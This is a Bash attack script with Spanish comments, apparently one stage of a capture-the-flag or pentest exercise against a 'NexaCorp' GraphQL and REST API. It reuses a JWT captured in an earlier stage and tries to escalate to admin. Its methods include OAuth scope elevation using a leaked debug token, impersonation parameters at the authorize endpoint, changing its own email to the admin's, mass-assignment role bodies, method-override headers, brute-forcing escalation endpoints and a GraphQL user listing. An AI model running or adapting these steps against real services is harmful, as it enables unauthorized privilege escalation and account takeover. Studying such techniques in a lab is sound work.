#!/usr/bin/env bash
# Stage 3 v2 — vectores no GraphQL puros
# Pista: "Te diste acceso al sistema que nunca tuvo la intención de conceder"
set -euo pipefail
source "$(dirname "$0")/00_config.sh"

JWT_FILE="${LOOT_DIR}/stage2_access_token.jwt"
JWT=$(cat "${JWT_FILE}")

CLIENT_ID="nexacorp-prod"
REDIRECT_URI="https://app.nexacorp.io/callback"

echo "##############################################"
echo "# A) OAuth con scopes elevados"
echo "##############################################"

RTOK=$(curl -s -X POST "${GQL_URL}" -H "Content-Type: application/json" \
  -d '{"query":"{ debugInfo { recon_token } }"}' | jq -r '.data.debugInfo.recon_token')

for scope in "admin" "openid profile admin" "write" "read write admin" "vault:read vault:write" "* admin"; do
  echo "--- scope=${scope} ---"
  LOC=$(curl -sI -G "${API_URL}/oauth/authorize" \
    --data-urlencode "client_id=${CLIENT_ID}" \
    --data-urlencode "redirect_uri=${REDIRECT_URI}" \
    --data-urlencode "response_type=code" \
    --data-urlencode "recon_token=${RTOK}" \
    --data-urlencode "scope=${scope}" \
    --data-urlencode "state=s$(date +%s)" \
    | tr -d '\r' | grep -i '^location:')
  CODE=$(echo "${LOC}" | sed -nE 's/.*[?&]code=([^&[:space:]]+).*/\1/p')
  if [[ -n "${CODE}" ]]; then
    RESP=$(curl -s -X POST "${API_URL}/oauth/token" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "grant_type=authorization_code&code=${CODE}&client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&scope=${scope}")
    echo "${RESP}" | jq -c
  fi
done

echo
echo "##############################################"
echo "# B) login_hint / subject / sub en authorize"
echo "##############################################"

RTOK=$(curl -s -X POST "${GQL_URL}" -H "Content-Type: application/json" \
  -d '{"query":"{ debugInfo { recon_token } }"}' | jq -r '.data.debugInfo.recon_token')

for params in \
  "login_hint=admin@nexacorp.io" \
  "login_hint=1001" \
  "subject=1001" \
  "sub=1001" \
  "user_id=1001" \
  "user=admin@nexacorp.io" \
  "id_token_hint=1001" \
  "act_as=1001" \
  "actor=admin@nexacorp.io"; do
  echo "--- ${params} ---"
  LOC=$(curl -sI -G "${API_URL}/oauth/authorize" \
    --data-urlencode "client_id=${CLIENT_ID}" \
    --data-urlencode "redirect_uri=${REDIRECT_URI}" \
    --data-urlencode "response_type=code" \
    --data-urlencode "recon_token=${RTOK}" \
    --data-urlencode "${params}" \
    --data-urlencode "state=s$(date +%s)" \
    | tr -d '\r' | grep -i '^location:')
  echo "  ${LOC}"
  CODE=$(echo "${LOC}" | sed -nE 's/.*[?&]code=([^&[:space:]]+).*/\1/p')
  if [[ -n "${CODE}" ]]; then
    RESP=$(curl -s -X POST "${API_URL}/oauth/token" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "grant_type=authorization_code&code=${CODE}&client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}")
    echo "  ${RESP}"
    JWT_NEW=$(echo "${RESP}" | jq -r '.access_token // empty')
    if [[ -n "${JWT_NEW}" ]]; then
      echo "  payload: $(echo ${JWT_NEW} | cut -d. -f2 | base64 -d 2>/dev/null)"
    fi
  fi
  echo
done

echo
echo "##############################################"
echo "# C) updateProfile(email del admin) — BOPLA"
echo "##############################################"
echo "[*] Cambio mi email al del admin"
curl -s -X POST "${GQL_URL}" -H "Content-Type: application/json" -H "Authorization: Bearer ${JWT}" \
  -d '{"query":"mutation { updateProfile(email:\"admin@nexacorp.io\") { id email role permissions } }"}' | jq

echo "[*] me ahora"
curl -s -X POST "${GQL_URL}" -H "Content-Type: application/json" -H "Authorization: Bearer ${JWT}" \
  -d '{"query":"{ me { id email role permissions } }"}' | jq

echo
echo "##############################################"
echo "# D) REST shadow endpoints — PUT/PATCH /api/v2/users/me"
echo "##############################################"

for METHOD in PATCH PUT POST; do
  for body in \
    '{"role":"admin"}' \
    '{"role":"admin","permissions":["admin","read","write"]}' \
    '{"permissions":["admin","read","write"]}' \
    '{"isAdmin":true}'; do
    for ep in /api/v2/users/me /api/v2/users/me/role /api/v2/users/me/permissions /api/v2/profile; do
      echo "--- ${METHOD} ${ep} body=${body} ---"
      curl -s -X ${METHOD} "${API_URL}${ep}" \
        -H "Authorization: Bearer ${JWT}" \
        -H "Content-Type: application/json" \
        -d "${body}" -w '\n[%{http_code}]\n'
    done
  done
done

echo
echo "##############################################"
echo "# E) HTTP method override en GraphQL"
echo "##############################################"

# Algunos servers Express con method-override permiten X-HTTP-Method-Override
for hdr in "X-HTTP-Method-Override: PATCH" "X-HTTP-Method: PUT" "X-Method-Override: PATCH"; do
  echo "--- ${hdr} ---"
  curl -s -X POST "${API_URL}/api/v2/users/me" \
    -H "Authorization: Bearer ${JWT}" \
    -H "${hdr}" \
    -H "Content-Type: application/json" \
    -d '{"role":"admin","permissions":["admin"]}' -w '\n[%{http_code}]\n'
done

echo
echo "##############################################"
echo "# F) Endpoints REST adicionales con auth"
echo "##############################################"

for ep in \
  /api/v2/auth/refresh \
  /api/v2/auth/elevate \
  /api/v2/auth/escalate \
  /api/v2/auth/sudo \
  /api/v2/users/me/elevate \
  /api/v2/users/me/sudo \
  /api/v2/users/me/scope \
  /api/v2/users/me/promote \
  /api/v2/admin/grant \
  /api/v2/admin/promote \
  /api/v2/profile \
  /api/v2/profile/role \
  /api/v2/profile/permissions \
  /api/v2/permissions/elevate; do
  for METHOD in GET POST; do
    code=$(curl -s -o /tmp/_b -w '%{http_code}' -X ${METHOD} "${API_URL}${ep}" \
      -H "Authorization: Bearer ${JWT}" \
      -H "Content-Type: application/json" \
      -d '{"role":"admin"}')
    if [[ "${code}" != "404" && "${code}" != "000" ]]; then
      echo "[${METHOD} ${code}] ${ep}"
      head -c 400 /tmp/_b
      echo; echo "---"
    fi
  done
done

echo
echo "##############################################"
echo "# G) Re-auth con un JWT modificado (sub=1001)"
echo "##############################################"
echo "[*] Decodifico el JWT actual para ver si podemos reusar firma con sub diferente..."
# (no se puede sin secret, pero veamos qué dice el header)
echo "${JWT}" | cut -d. -f1 | base64 -d 2>/dev/null
echo
echo "${JWT}" | cut -d. -f2 | base64 -d 2>/dev/null | jq

echo
echo "##############################################"
echo "# H) GraphQL — pedir el rol de otro user vía me{} con alias y fragmentos"
echo "##############################################"
curl -s -X POST "${GQL_URL}" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${JWT}" \
  -d '{"query":"{ admin: users { id email role permissions @include(if:true) } }"}' | jq
